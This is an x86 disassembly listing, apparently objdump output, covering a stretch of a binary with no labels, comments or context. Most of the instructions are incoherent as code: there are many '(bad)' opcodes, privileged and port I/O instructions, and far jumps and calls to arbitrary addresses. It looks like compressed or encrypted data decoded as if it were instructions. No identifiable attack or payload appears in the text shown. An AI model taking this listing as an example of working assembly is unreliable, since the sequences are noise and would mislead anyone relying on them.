  40fab3:	call   0x64ce13c1
  40fab8:	jmp    0x27a7f938
  40fabd:	mov    dl,cl
  40fabf:	pop    esi
  40fac0:	icebp  
  40fac1:	add    al,0x8d
  40fac3:	pushf  
  40fac4:	pop    ss
  40fac5:	test   dh,bh
  40fac7:	dec    esi
	...
  40fae0:	add    dl,al
  40fae2:	inc    esi
  40fae3:	out    0x4d,eax
  40fae5:	rol    BYTE PTR [eax+eax*1],1
  40fae8:	fs aaa 
  40faea:	add    DWORD PTR ds:0x67d33562,ebx
  40faf0:	imul   ecx,DWORD PTR [ebp-0x3a],0x837473ff
  40faf7:	cli    
  40faf8:	push   ds
  40faf9:	jle    0x40face
  40fafb:	out    0x5f,eax
  40fafd:	jl     0x40fa82
  40faff:	(bad)  
  40fb00:	fs aaa 
  40fb02:	adc    dl,BYTE PTR [ebp+0x74c37b29]
  40fb08:	lock retf 0x65c2
  40fb0c:	pusha  
  40fb0d:	je     0x40fa91
  40fb0f:	cli    
  40fb10:	out    dx,al
  40fb11:	ins    DWORD PTR es:[edi],dx
  40fb12:	(bad)  
  40fb13:	cmp    al,0xad
  40fb15:	loope  0x40fb59
  40fb17:	add    BYTE PTR [ebx+edx*2-0x7e],ch
  40fb1b:	cli    
  40fb1c:	(bad)  
  40fb1d:	jge    0x40faf1
  40fb1f:	(bad)  
  40fb20:	mov    dh,0xe2
  40fb22:	sbb    BYTE PTR [ebp-0x924b800],cl
  40fb28:	push   DWORD PTR [edx+0x39]
  40fb2b:	push   0x0
  40fb2d:	adc    BYTE PTR [edx],dl
  40fb2f:	mov    al,0x8b
  40fb31:	dec    esi
  40fb32:	mov    eax,ds:0x68ca194
  40fb37:	test   eax,eax
  40fb39:	repz imul ecx,DWORD PTR [ecx-0x77df323a],0x8d08cee0
  40fb44:	test   DWORD PTR [eax],eax
	...
  40fb5e:	jne    0x40faee
  40fb60:	std    
  40fb61:	dec    DWORD PTR ds:0x5dfd66a1
  40fb67:	push   es
  40fb68:	test   eax,eax
  40fb6a:	inc    edx
  40fb6b:	repz mov esi,0x9120d84
  40fb71:	xor    ebx,DWORD PTR ds:0xa5858927
  40fb77:	(bad)  
  40fb78:	std    
  40fb79:	jmp    DWORD PTR [eax-0x4d0608ff]
  40fb7f:	mov    ecx,DWORD PTR [esi-0x1]
  40fb82:	or     cl,BYTE PTR [ebx+esi*1-0x384604]
  40fb89:	add    BYTE PTR [eax+0x66],0xdc
  40fb8d:	inc    ebx
  40fb8e:	or     eax,0xad15ff08
  40fb93:	jp     0x40fbd3
  40fb95:	add    BYTE PTR [eax+ecx*1+0x510d43e5],bh
  40fb9c:	shl    DWORD PTR [ebp+eax*1+0x39],0x50
  40fba1:	dec    eax
  40fba3:	imul   edx,DWORD PTR [ecx],0x409ddd40
  40fba9:	pop    ebx
  40fbaa:	int    0x5
  40fbac:	lea    ecx,[ebp-0x27633]
  40fbb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbb3:	int    0x19
  40fbb5:	add    dh,ah
  40fbb7:	imul   esi,DWORD PTR [ebp-0x74],0xffffffbc
  40fbbb:	push   esp
  40fbbc:	xchg   esi,edi
  40fbbe:	int3   
  40fbbf:	cwde   
  40fbc0:	jmp    0x40fbc3
	...
  40fbda:	add    ah,dh
  40fbdc:	aad    0xef
  40fbde:	mov    WORD PTR [ecx-0x63],?
  40fbe1:	mov    bh,dh
  40fbe3:	mov    ds:0x69001e1b,eax
  40fbe8:	and    BYTE PTR [edx+ecx*4-0x49],bh
  40fbec:	xchg   ebx,eax
  40fbed:	mul    DWORD PTR [eax-0x4082940b]
  40fbf3:	add    al,BYTE PTR [ebp+0x75]
  40fbf6:	je     0x40fb94
  40fbf8:	ret    
  40fbf9:	push   eax
  40fbfa:	push   DWORD PTR [ebx+0x6b]
  40fbfd:	call   0xb98d:0x26cb572
  40fc04:	jecxz  0x40fc38
  40fc06:	mov    esi,DWORD PTR [edx]
  40fc08:	mov    ebx,0xd74c8475
  40fc0d:	xchg   esi,edi
  40fc0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc10:	ret    
  40fc11:	lods   eax,DWORD PTR ds:[esi]
  40fc12:	sti    
  40fc13:	hlt    
  40fc14:	imul   edi,DWORD PTR [ebp-0x41],0xffffffeb
  40fc18:	loopne 0x40fbdc
  40fc1a:	xor    DWORD PTR [eax+edi*4],0xfffffff9
  40fc1e:	xor    dh,BYTE PTR [ecx+edx*2]
  40fc21:	jns    0x40fba7
  40fc23:	sbb    al,0x37
  40fc25:	mov    dh,bh
  40fc27:	imul   esi,eax,0x2213f38a
  40fc2d:	xor    ebp,DWORD PTR [eax-0xb]
  40fc30:	imul   eax,DWORD PTR [edx],0xffffff80
  40fc33:	add    edi,DWORD PTR [eax+0x62]
  40fc36:	adc    dh,BYTE PTR [ebx+ebp*2+0x5abc347b]
  40fc3d:	inc    edx
	...
  40fc56:	add    BYTE PTR [eax],al
  40fc58:	jns    0x40fc4b
  40fc5a:	xchg   edx,eax
  40fc5b:	mul    ebx
  40fc5d:	outs   dx,DWORD PTR ds:[esi]
  40fc5e:	xor    DWORD PTR [ebp-0x7816fa8f],ecx
  40fc64:	rol    BYTE PTR [eax-0x6d5e78c8],cl
  40fc6a:	imul   edi,esp,0xffffffc1
  40fc6d:	or     ch,0x34
  40fc70:	imul   ecx,DWORD PTR [edx-0x7f4d7240],0x92c18718
  40fc7a:	jae    0x40fc70
  40fc7c:	mov    ds:0x7e4cad80,al
  40fc81:	add    eax,0x559c03e9
  40fc86:	sub    BYTE PTR ds:0xfc6b91f4,al
  40fc8c:	add    DWORD PTR [eax-0x7596cb73],0x80728c78
  40fc96:	sbb    BYTE PTR [ecx+0x70],bh
  40fc99:	or     eax,0xd5628777
  40fc9e:	pop    ebx
  40fc9f:	or     DWORD PTR [ebx+0x7d],0x8bc38765
  40fca6:	and    eax,0xecf98b34
  40fcab:	add    esi,esp
  40fcad:	xchg   ecx,eax
  40fcae:	xchg   ebx,eax
  40fcaf:	test   BYTE PTR [ebx-0x80],cl
  40fcb2:	inc    ebp
  40fcb3:	pushf  
  40fcb4:	push   es
  40fcb5:	stos   DWORD PTR es:[edi],eax
  40fcb6:	out    0x3,eax
  40fcb8:	ja     0x40fd03
  40fcba:	fadd   QWORD PTR [eax+0x0]
	...
  40fcd4:	add    BYTE PTR [ebx-0x1],ah
  40fcd7:	loopne 0x40fd53
  40fcd9:	xor    ebp,edx
  40fcdb:	adc    BYTE PTR [esi-0x3316fa5a],ah
  40fce1:	call   0xf48408ea
  40fce6:	stc    
  40fce7:	loopne 0x40fd02
  40fce9:	hlt    
  40fcea:	jg     0x40fcc7
  40fcec:	inc    edi
  40fced:	add    eax,0xd94ce8c5
  40fcf2:	add    eax,0x91f7e900
  40fcf7:	test   cl,ch
  40fcf9:	push   0x7e
  40fcfb:	(bad)  
  40fcfc:	scas   eax,DWORD PTR es:[edi]
  40fcfd:	test   DWORD PTR [eax+eax*2],0x5e7de530
  40fd04:	aaa    
  40fd05:	sub    BYTE PTR ds:0xd8b6a05b,al
  40fd0b:	mov    dl,ch
  40fd0d:	jbe    0x40fd7a
  40fd0f:	pop    ss
  40fd10:	sbb    al,bh
  40fd12:	pop    edx
  40fd13:	push   ebp
  40fd14:	sbb    ah,bh
  40fd16:	ror    DWORD PTR [edx+0x1fdf18a6],cl
  40fd1c:	jo     0x40fcf8
  40fd1e:	sub    BYTE PTR [ecx-0x729857c2],cl
  40fd24:	xor    bh,al
  40fd26:	add    al,0x84
  40fd28:	test   eax,0xe9b78382
  40fd2d:	test   DWORD PTR [edi+edx*2],0xe76d046c
  40fd34:	out    0xe,eax
  40fd36:	add    eax,0x6500
	...
  40fd4f:	add    BYTE PTR [eax],al
  40fd51:	add    BYTE PTR [edi],dh
  40fd53:	push   cs
  40fd54:	test   BYTE PTR [esi+0x700004f7],cl
  40fd5a:	sbb    al,0x75
  40fd5c:	mov    BYTE PTR [ebx+esi*2-0x70e5fe96],dh
  40fd63:	in     eax,dx
  40fd64:	add    al,0x74
  40fd66:	mov    ah,0x7c
  40fd68:	dec    edi
  40fd69:	xchg   esi,eax
  40fd6a:	pop    DWORD PTR [ecx]
  40fd6c:	pop    ebx
  40fd6d:	jmp    0xdf043969
  40fd72:	fwait
  40fd73:	mov    bh,bh
  40fd75:	call   0xe5388171
  40fd7a:	in     al,0xe2
  40fd7c:	mov    ch,BYTE PTR [edi+ebp*2+0x7df14732]
  40fd83:	into   
  40fd84:	pop    ss
  40fd85:	add    BYTE PTR [ebp-0x1ccc03c3],ch
  40fd8b:	cld    
  40fd8c:	(bad)  
  40fd8d:	add    ecx,DWORD PTR [eax-0x1aba786e]
  40fd93:	je     0x40fe08
  40fd95:	hlt    
  40fd96:	pop    esi
  40fd97:	inc    esp
  40fd98:	add    eax,DWORD PTR [ebx+0x753b0983]
  40fd9e:	mov    ecx,0xd0723c10
  40fda3:	dec    ebp
  40fda4:	pop    ebx
  40fda5:	call   0x7c4b9c
  40fdaa:	popf   
  40fdab:	loop   0x40fdab
  40fdad:	jbe    0x40fdaa
  40fdaf:	sbb    al,BYTE PTR [eax]
  40fdb1:	push   esi
  40fdb2:	(bad)  
  40fdb3:	sti    
  40fdb4:	(bad)
	...
  40fdcf:	nop
  40fdd0:	sub    eax,0x49110000
  40fdd5:	jb     0x40fe1a
  40fdd7:	push   cs
  40fdd8:	inc    eax
  40fdd9:	and    BYTE PTR [ecx],al
  40fddb:	adc    al,0x26
  40fddd:	lock mov DWORD PTR [eax-0x72],esi
  40fde1:	adc    DWORD PTR [edi+0x31],0xe945f602
  40fde8:	add    DWORD PTR [ebp-0x70],esi
  40fdeb:	into   
  40fdec:	add    eax,0xfc3300f8
  40fdf1:	std    
  40fdf2:	inc    edi
  40fdf3:	in     eax,0x9b
  40fdf5:	xor    DWORD PTR [ebx],0x6
  40fdf8:	xor    al,0xff
  40fdfa:	jne    0x40fd9d
  40fdfc:	sti    
  40fdfd:	vpshuflw ymm2,YMMWORD PTR [edx+0x257e2e6],0x0
  40fe06:	test   ch,cl
  40fe08:	adc    al,0x10
  40fe0a:	jmp    DWORD PTR [edx]
  40fe0c:	mov    DWORD PTR [ebx],edx
  40fe0e:	pop    esp
  40fe0f:	cmpps  xmm7,xmm7,0x84
  40fe13:	fst    QWORD PTR [esp+eax*1]
  40fe16:	mov    al,0xf4
  40fe18:	ins    BYTE PTR es:[edi],dx
  40fe19:	xchg   edi,eax
  40fe1a:	add    esi,eax
  40fe1c:	sub    esp,DWORD PTR [esi]
  40fe1e:	pop    ebx
  40fe1f:	mov    ebp,0x7705792a
  40fe24:	add    eax,DWORD PTR [ebp-0x3c0f108d]
  40fe2a:	jae    0x40fe1f
  40fe2c:	fwait
  40fe2d:	adc    DWORD PTR [eax+edx*1],0x7a
  40fe31:	inc    edx
	...
  40fe4a:	add    BYTE PTR [eax],al
  40fe4c:	jg     0x40fdf3
  40fe4e:	call   0xcc56:0x26c1dcc
  40fe55:	push   ds
  40fe56:	dec    ebx
  40fe57:	add    ah,dh
  40fe59:	repnz mov esp,0x2d1645c2
  40fe5f:	push   0xffffffe4
  40fe61:	inc    ebx
  40fe62:	loopne 0x40fe1c
  40fe64:	cmc    
  40fe65:	imul   edi,DWORD PTR [ebp-0x41],0x8
  40fe69:	push   es
  40fe6a:	jns    0x40feb7
  40fe6c:	shl    BYTE PTR [edi+0x7f],1
  40fe6f:	pop    es
  40fe70:	sub    edx,0x3a
  40fe73:	or     BYTE PTR [ebx-0x16],bh
  40fe76:	cmp    cl,BYTE PTR [ebx+esi*2]
  40fe79:	jmp    0x1422:0xeaf41022
  40fe80:	hlt    
  40fe81:	in     al,0x3a
  40fe83:	sbb    BYTE PTR [edi-0x5],ch
  40fe86:	xchg   edi,eax
  40fe87:	add    DWORD PTR [edi],eax
  40fe89:	fidivr WORD PTR [ebp-0xb]
  40fe8c:	shl    DWORD PTR [edi-0x31],0xbf
  40fe90:	dec    edi
  40fe91:	jno    0x40ff0a
  40fe93:	inc    ebx
  40fe94:	adc    BYTE PTR [edi+esi*2-0x3],bh
  40fe98:	jge    0x40ff07
  40fe9a:	call   0x3483:0x843e2ab7
  40fea1:	sar    bl,0xe7
  40fea4:	xchg   BYTE PTR [esi],ch
  40fea6:	test   dh,bh
  40fea8:	pop    ds
  40fea9:	add    al,0xd
  40feab:	js     0x40fede
  40fead:	fnstsw WORD PTR [esi+0x2a]
	...
  40fec7:	add    BYTE PTR [eax],al
  40fec9:	ss or  al,0xe9
  40fecc:	outs   dx,DWORD PTR cs:[esi]
  40fece:	jo     0x40ff39
  40fed0:	xchg   edi,eax
  40fed1:	or     ebx,eax
  40fed3:	sahf   
  40fed4:	jbe    0x40ff06
  40fed6:	or     DWORD PTR [ecx-0x45f6977c],ebx
  40fedc:	test   al,0x46
  40fede:	jl     0x40ff53
  40fee0:	sti    
  40fee1:	fcmovnb st,st(3)
  40fee3:	int    0x4
  40fee5:	hlt    
  40fee6:	lea    esp,[ebx]
  40fee8:	or     al,0xff
  40feea:	inc    edi
  40feeb:	in     eax,0x87
  40feed:	nop
  40feee:	add    eax,0x71e03e9
  40fef3:	sbb    dl,bh
  40fef5:	jle    0x40ff3b
  40fef7:	shl    BYTE PTR [esi+edi*1],1
  40fefa:	add    eax,0xc5b87e9
  40feff:	mov    ss,WORD PTR gs:[ebx+0x78dae87c]
  40ff06:	repnz nop
  40ff08:	ins    BYTE PTR es:[edi],dx
  40ff09:	mov    al,0xde
  40ff0b:	call   0x14866f13
  40ff10:	add    DWORD PTR [edi-0x3c],edi
  40ff13:	loopne 0x40ff4b
  40ff15:	mov    cl,0xc
  40ff17:	jb     0x40ff52
  40ff19:	mov    al,0x16
  40ff1b:	sub    DWORD PTR [ebp*2-0x45718b3e],eax
  40ff22:	sbb    al,0xba
  40ff24:	mov    esi,DWORD PTR [eax+0x3fc96b7c]
  40ff2a:	aad    0xc2
  40ff2c:	or     BYTE PTR [eax],al
	...
  40ff46:	imul   eax,edx,0x3432d454
  40ff4c:	inc    esi
  40ff4d:	pop    edx
  40ff4e:	jo     0x40ff95
  40ff50:	mov    ah,0x42
  40ff52:	ja     0x40ff4e
  40ff54:	push   DWORD PTR [ebp*8+0x649a38f1]
  40ff5b:	sar    ebx,0xb9
  40ff5e:	jbe    0x40ff51
  40ff60:	pop    es
  40ff61:	push   ds
  40ff62:	std    
  40ff63:	ud0    ebx,esi
  40ff66:	jbe    0x40ffba
  40ff68:	test   BYTE PTR [ecx],ch
  40ff6a:	in     al,dx
  40ff6b:	and    DWORD PTR [ebx+0x453dffac],ecx
  40ff71:	std    
  40ff72:	fcomp  QWORD PTR [ecx]
  40ff74:	sub    DWORD PTR [esi-0x4900f9e9],0xffffffe8
  40ff7b:	(bad)  [ebx]
  40ff7d:	out    0xbe,al
  40ff7f:	and    edi,edi
  40ff81:	hlt    
  40ff82:	add    edx,DWORD PTR [edi]
  40ff84:	inc    eax
  40ff85:	jmp    0xc14cf000
  40ff8a:	lds    esi,FWORD PTR [ebx+0x467e900]
  40ff90:	jmp    0x40ff9b
  40ff92:	retf   
  40ff93:	jp     0x410009
  40ff95:	lds    ebp,FWORD PTR [edx+0x42]
  40ff98:	(bad)  
  40ff99:	xor    al,0x20
  40ff9b:	fs xchg ebp,eax
  40ff9d:	inc    eax
  40ff9e:	lock add al,0xff
  40ffa1:	(bad)  
  40ffa2:	jbe    0x40ffb4
  40ffa4:	pop    esp
  40ffa5:	sti    
  40ffa6:	mov    bh,0x7b
  40ffa8:	std    
  40ffa9:	adc    al,0x0
	...
  40ffc3:	add    al,0x6d
  40ffc5:	sub    eax,DWORD PTR [ecx-0x10]
  40ffc8:	add    al,0x32
  40ffca:	test   eax,0xabc8de55
  40ffcf:	out    dx,eax
  40ffd0:	add    al,0x55
  40ffd2:	(bad)
  40ffd7:	and    cl,BYTE PTR [esi-0x71e10aa3]
  40ffdd:	jge    0x40ffd8
  40ffdf:	retf   0x6a3d
  40ffe2:	in     al,0x84
  40ffe4:	shl    bh,0x0
  40ffe7:	lea    ebx,[ebp-0x1a]
  40ffea:	adc    DWORD PTR [edi+eax*1+0x0],0x750ce583
  40fff2:	cmp    BYTE PTR [esi+0x5b33f64c],dl
  40fff8:	pop    ds
  40fff9:	mov    cl,BYTE PTR [ebp-0x1f]
  40fffc:	xor    DWORD PTR [esi+0x18],ecx
  40ffff:	nop
  410000:	push   edi
  410001:	add    ecx,DWORD PTR [ecx-0x5fe0980]
  410007:	fs gs repnz cmp esi,0x5
  41000d:	mov    DWORD PTR [ebp-0x1b],eax
  410010:	(bad)  
  410011:	dec    ebx
  410012:	cld    
  410013:	retf   
  410014:	(bad)  
  410015:	push   DWORD PTR [ecx+ebx*8-0x7d]
  410019:	mov    esi,0xfe68c875
  41001e:	push   edx
  41001f:	cli    
  410020:	xchg   esp,eax
  410022:	call   0x3f5e1b
	...
  41003f:	add    BYTE PTR [ecx],bl
  410041:	shl    DWORD PTR [ebx-0x49],0x9f
  410045:	(bad)  
  410046:	pop    ebp
  410047:	pop    ebx
  410048:	push   esp
  410049:	ror    BYTE PTR [ecx+0x448e4d45],0x8
  410050:	push   es
  410051:	inc    edx
  410052:	repnz mov ebx,ebx
  410055:	adc    al,0x89
  410057:	jle    0x4100d6
  410059:	(bad)  
  41005a:	pop    esp
  41005b:	adc    al,0xcd
  41005d:	add    eax,0x880ce6eb
  410062:	inc    ebp
  410063:	or     dh,ah
  410065:	push   ebx
  410066:	or     cl,BYTE PTR [ebx+0x53d1207d]
  41006c:	jmp    0x4100ed
  41006e:	clc    
  41006f:	jmp    FWORD PTR [ecx]
  410071:	push   0x6858c081
  410076:	inc    BYTE PTR [edx+0x51043cf4]
  41007c:	(bad)  
  41007d:	out    0x48,al
  41007f:	out    0x12,eax
  410081:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410082:	add    al,BYTE PTR [eax]
  410084:	js     0x4100b2
  410086:	clc    
  410087:	push   esp
  410088:	outs   dx,DWORD PTR ds:[esi]
  410089:	mov    ebx,0x638b2b12
  41008e:	sub    ebp,0xfffffff1
  410091:	mov    ecx,0x6d4b586a
  410096:	add    cl,BYTE PTR [ebx+0x735ce91c]
  41009c:	xor    al,0xe1
  41009e:	jns    0x410118
  4100a0:	stc    
  4100a1:	xchg   ebp,eax
  4100a2:	xlat   BYTE PTR ds:[ebx]
  4100a3:	inc    BYTE PTR [eax]
	...
  4100bd:	or     DWORD PTR [eax-0x110bbfec],esi
  4100c3:	dec    ebx
  4100c4:	(bad)  
  4100c5:	fbld   TBYTE PTR [ebx-0x28]
  4100c8:	push   edx
  4100c9:	and    edx,DWORD PTR [ebx+edx*2+0x57]
  4100cd:	hlt    
  4100ce:	imul   edi,DWORD PTR [ebx],0xffffffc6
  4100d1:	inc    ecx
  4100d2:	jno    0x4100c0
  4100d4:	add    BYTE PTR [ebx+0x7f1827cf],dh
  4100da:	test   eax,0x538cca8b
  4100df:	call   FWORD PTR [bp+di-0x311a]
  4100e4:	and    esp,esp
  4100e6:	in     al,0x1
  4100e8:	test   DWORD PTR [edi+edx*1-0x690a4ff8],esi
  4100ef:	or     dl,BYTE PTR [ebx-0x74]
  4100f2:	pop    esi
  4100f3:	mov    bh,0x0
  4100f5:	hlt    
  4100f6:	pop    ebp
  4100f7:	inc    edx
  4100f8:	pop    ebp
  4100f9:	iret   
  4100fa:	and    al,0x46
  4100fc:	pop    es
  4100fd:	hlt    
  4100fe:	adc    BYTE PTR [ebp+0xc286feb],cl
  410104:	and    DWORD PTR [eax+0x5b],0xffffffd3
  410108:	mov    ch,BYTE PTR [ecx+0x3724f504]
  41010e:	shr    BYTE PTR [ecx+0x7b],cl
  410111:	cmp    cl,BYTE PTR [ecx]
  410113:	ins    DWORD PTR es:[edi],dx
  410114:	mov    dh,BYTE PTR [ebx]
  410116:	jns    0x410100
  410118:	fdivr  DWORD PTR [eax-0x11]
  41011b:	cmp    BYTE PTR [ebx+0x27],ch
  41011e:	shr    eax,1
  410120:	add    eax,DWORD PTR [eax]
	...
  41013a:	jo     0x410180
  41013c:	mov    esp,0x34d7ceff
  410141:	clc    
  410142:	xor    dh,0xf0
  410145:	mov    WORD PTR [eax+0xbc6e20c],?
  41014b:	cmc    
  41014c:	add    DWORD PTR [eax+ebx*2+0x5084e875],0x71
  410154:	call   0x73b8e546
  410159:	ja     0x4101c9
  41015b:	inc    eax
  41015c:	cmc    
  41015d:	cmc    
  41015e:	jecxz  0x4101cd
  410160:	scas   eax,DWORD PTR es:[edi]
  410161:	fcmovne st,st(3)
  410163:	js     0x4101d1
  410165:	inc    esp
  410166:	inc    edi
  410167:	rcl    DWORD PTR [edx+0x9],cl
  41016a:	imul   eax,edx,0x6d4ad4d0
  410170:	and    ah,bl
  410172:	stos   DWORD PTR es:[edi],eax
  410173:	js     0x4101de
  410175:	jl     0x41016f
  410177:	icebp  
  410178:	daa    
  410179:	mov    esp,DWORD PTR [eax]
  41017b:	jge    0x410176
  41017d:	imul   bl
  41017f:	mov    ah,BYTE PTR ds:0xa4c1c41c
  410185:	mov    ebp,DWORD PTR [eax]
  410187:	or     eax,0x476e43da
  41018c:	jmp    0x13cf6561
  410191:	jl     0x410199
  410193:	ret    0x837c
  410196:	xor    al,0x2
  410198:	push   0x54
  41019a:	pop    ebx
  41019b:	cmp    eax,0x1c00
	...
  4101b4:	add    BYTE PTR [eax],al
  4101b6:	add    al,cl
  4101b8:	lock pop es
  4101ba:	bound  ebp,QWORD PTR ds:0xf3bc3a74
  4101c0:	lock sbb DWORD PTR [eax+0x25],esi
  4101c4:	push   0x3aabac88
  4101c9:	inc    ebp
  4101ca:	frstor [edx]
  4101cc:	push   DWORD PTR [ecx-0x77]
  4101cf:	(bad)  
  4101d1:	pop    es
  4101d2:	mov    bh,0x7e
  4101d4:	rcl    BYTE PTR ss:[edi-0x1e3eb2d2],0xf7
  4101dc:	outs   dx,BYTE PTR ds:[esi]
  4101dd:	inc    esp
  4101de:	and    eax,0x64f1f1f9
  4101e3:	xor    bl,0xed
  4101e6:	(bad)  
  4101e7:	in     eax,dx
  4101e8:	mov    BYTE PTR [bp-0x71fd],ah
  4101ed:	jbe    0x4101e0
  4101ef:	jo     0x4101bf
  4101f1:	or     esi,DWORD PTR [eax-0x55]
  4101f4:	pop    es
  4101f5:	mov    al,0xe8
  4101f7:	pop    esi
  4101f8:	pop    ecx
  4101f9:	push   esp
  4101fa:	bound  eax,QWORD PTR [ebx+ecx*4+0x45]
  4101fe:	icebp  
  4101ff:	outs   dx,BYTE PTR ds:[esi]
  410200:	leave  
  410201:	or     esi,DWORD PTR [edx+0x27]
  410204:	and    edx,ecx
  410206:	push   0x23
  410208:	or     BYTE PTR [ebx+0x76f42ad3],al
  41020e:	push   ebx
  41020f:	clc    
  410210:	aad    0x4f
  410212:	jb     0x410245
  410214:	pusha  
  410215:	popf   
  410216:	push   ds
  410217:	clc    
  410218:	add    al,0x84
  41021a:	test   eax,0x0
	...
  410233:	add    BYTE PTR [ebx+0x64ec69df],al
  410239:	shl    bl,0x39
  41023c:	mov    ds:0xf83eac5f,al
  410241:	add    al,0x83
  410243:	xchg   ecx,eax
  410244:	cld    
  410245:	icebp  
  410246:	push   esi
  410247:	add    dh,ah
  410249:	dec    ecx
  41024a:	push   ss
  41024b:	xor    DWORD PTR [eax],ecx
  41024d:	std    
  41024e:	das    
  41024f:	dec    ebp
  410250:	ror    DWORD PTR [ebp+0x359c8acf],1
  410256:	inc    ebp
  410257:	clc    
  410258:	daa    
  410259:	add    edi,edi
  41025b:	jbe    0x4102a6
  41025d:	pop    es
  41025e:	add    edi,edi
  410260:	push   ebx
  410261:	or     esi,DWORD PTR [edx]
  410263:	ret    0x4c95
  410266:	test   BYTE PTR [ebx+0x5761ebd3],0xd
  41026d:	add    eax,DWORD PTR [eax+eax*8+0x6a3451]
  410274:	test   al,0x4c
  410276:	cli    
  410277:	push   eax
  410278:	addr16 or al,0x8d
  41027b:	inc    ebp
  41027c:	loope  0x4102d1
  41027e:	std    
  41027f:	or     bl,BYTE PTR ss:0x29d124c
  410286:	test   eax,eax
  410288:	popa   
  410289:	sbb    eax,0xfed97d83
  41028e:	je     0x41029f
  410290:	retf   0xff31
  410293:	dec    esi
  410294:	mov    ch,0xf7
  410296:	adc    edi,DWORD PTR [eax+eax*1]
	...
  4102b1:	mov    edi,0xccaffe42
  4102b6:	retf   
  4102b7:	shl    DWORD PTR [edx],0x5d
  4102ba:	retf   0xf6c1
  4102bd:	shr    DWORD PTR [esp+eax*1],1
  4102c0:	add    DWORD PTR [ebx],eax
  4102c2:	mov    edi,gs
  4102c4:	(bad)  
  4102c5:	xchg   ebx,eax
  4102c6:	ss je  0x410309
  4102c9:	popf   
  4102ca:	outs   dx,BYTE PTR ds:[esi]
  4102cb:	add    al,0x56
  4102cd:	mov    ch,0xb7
  4102cf:	mov    bl,0x1
  4102d1:	lea    ecx,[ebp+0xd4f5ec4]
  4102d7:	add    BYTE PTR [esi-0xc],dl
  4102da:	loop   0x4102d3
  4102dc:	and    edi,esp
  4102de:	loop   0x4102e5
  4102e0:	push   edi
  4102e1:	outs   dx,DWORD PTR ds:[esi]
  4102e2:	scas   al,BYTE PTR es:[edi]
  4102e3:	jl     0x410334
  4102e5:	lock loopne 0x41032b
  4102e8:	je     0x4102e3
  4102ea:	jmp    0x1e8:0x565ffe4c
  4102f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102f2:	ror    DWORD PTR [eax-0x789409e3],cl
  4102f8:	idiv   DWORD PTR [ecx-0x31]
  4102fb:	test   DWORD PTR [edi],0x21c871c
  410301:	hlt    
  410302:	out    0x43,eax
  410304:	jae    0x4102f9
  410306:	repnz add eax,0xd42f428b
  41030c:	pop    es
  41030d:	ja     0x410336
  41030f:	jge    0x410384
  410311:	out    dx,al
  410312:	call   0x417693
	...
  41032b:	add    BYTE PTR [eax],al
  41032d:	add    dl,dh
  41032f:	scas   al,BYTE PTR es:[edi]
  410330:	push   0xffffffb4
  410332:	lds    ecx,FWORD PTR [esi]
  410334:	jge    0x4102c0
  410336:	repnz add DWORD PTR [ecx],0x13feb28b
  41033d:	pop    edi
  41033e:	daa    
  41033f:	sub    al,0xde
  410341:	sar    eax,0x6b
  410344:	aad    0x8a
  410346:	fcomp  DWORD PTR [ebx+edx*8+0x74e8bc8a]
  41034d:	je     0x41033f
  41034f:	sbb    DWORD PTR [edx+ebp*8-0x10],eax
  410353:	call   0xc24176d3
  410358:	add    edx,DWORD PTR [esi+0xc]
  41035b:	dec    DWORD PTR [eax+0x3f]
  41035e:	hlt    
  41035f:	rol    DWORD PTR [ebx],1
  410361:	call   0x4533fc
  410366:	jl     0x410388
  410368:	jge    0x410354
  41036a:	out    0x4,eax
  41036c:	aas    
  41036d:	in     al,dx
  41036e:	mov    edx,0xde042849
  410373:	add    al,0x81
  410375:	or     BYTE PTR [edx-0x5c7916fd],bh
  41037b:	add    eax,0x845ac65c
  410380:	sti    
  410381:	jl     0x4103d6
  410383:	lock loopne 0x41030e
  410386:	icebp  
  410387:	jmp    0x89f8:0x753188e7
  41038e:	mov    al,0x75
  410390:	mov    ebp,0x4a
	...
  4103a9:	add    BYTE PTR [eax],al
  4103ab:	ss jg  0x41040c
  4103ae:	div    dh
  4103b0:	xor    DWORD PTR [ecx],ebp
  4103b2:	inc    eax
  4103b3:	retf   0xe8ea
  4103b6:	jmp    0x3d11d2d6
  4103bb:	aas    
  4103bc:	(bad)  
  4103bd:	call   0xe92c0fab
  4103c2:	jl     0x4103ac
  4103c4:	cwde   
  4103c5:	cli    
  4103c6:	ret    
  4103c7:	sti    
  4103c8:	mov    DWORD PTR [eax],esp
  4103ca:	xchg   dl,dh
  4103cc:	cli    
  4103cd:	loopne 0x410357
  4103cf:	icebp  
  4103d0:	fsubrp st(7),st
  4103d2:	mov    BYTE PTR [ecx-0x4d77278c],dh
  4103d8:	aam    0x29
  4103da:	mov    BYTE PTR [ecx],bh
  4103dc:	or     DWORD PTR [ebx+eax*2+0x47],ebp
  4103e0:	add    BYTE PTR [ecx-0x5671784],bl
  4103e6:	ret    
  4103e7:	mov    ebx,0xf4004687
  4103ec:	jg     0x4103dc
  4103ee:	sub    BYTE PTR [ebx-0x7],0xe2
  4103f2:	shl    DWORD PTR [edx+0x3416ed1a],cl
  4103f8:	add    eax,0x47f4226a
  4103fd:	inc    DWORD PTR [eax-0x20]
  410400:	pop    es
  410401:	add    cl,ch
  410403:	(bad)  
  410404:	fs je  0x410431
  410407:	lock pop esp
  410409:	cmp    BYTE PTR [ecx-0x6],dl
  41040c:	add    al,0x33
  41040e:	xchg   esi,eax
	...
  410427:	add    BYTE PTR [ecx-0xf],bh
  41042a:	fbld   TBYTE PTR [eax+0x5d]
  41042d:	push   eax
  41042e:	imul   ebp,ebx,0x248cdb46
  410434:	fadd   st,st(3)
  410436:	(bad)  
  410437:	cld    
  410438:	repz jae 0x41046f
  41043b:	ins    DWORD PTR es:[edi],dx
  41043c:	aam    0xc6
  41043e:	call   edx
  410440:	mov    esi,0x96d347e
  410445:	vandnps ymm0,ymm0,ymm6
  410449:	mov    BYTE PTR [edi-0x3fc9092c],bh
  41044f:	push   eax
  410450:	mov    dh,BYTE PTR [ebx-0x2]
  410453:	jmp    0x9e980a79
  410458:	jl     0x410423
  41045a:	fistp  DWORD PTR [ecx+0x260bf87e]
  410460:	lds    eax,FWORD PTR [eiz*8-0x1210856]
  410467:	push   ss
  410468:	inc    esi
  410469:	mov    DWORD PTR [edi+0x33ec5795],edi
  41046f:	icebp  
  410470:	test   DWORD PTR [edx+ebp*2],0xd8394ef1
  410477:	pop    ds
  410478:	mov    bl,0x73
  41047a:	std    
